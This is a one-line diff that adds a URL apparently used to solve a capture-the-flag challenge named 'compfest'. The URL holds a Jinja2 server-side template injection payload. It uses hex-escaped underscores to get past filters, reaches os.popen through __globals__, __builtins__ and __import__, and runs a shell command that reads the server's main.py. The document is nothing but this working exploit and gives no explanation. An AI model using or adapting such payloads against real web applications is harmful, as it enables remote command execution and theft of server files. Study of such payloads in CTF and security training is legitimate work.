@@ -1,0 +1,1 @@
+http://url-compfest/?name={{request[%27application%27][%27\x5f\x5fglobals\x5f\x5f%27][%27\x5f\x5fbuiltins\x5f\x5f%27][%27\x5f\x5fimport\x5f\x5f%27](%27os%27)[%27popen%27](%27more main.py%27)[request.args.get(%27param%27)]()}}&param=read
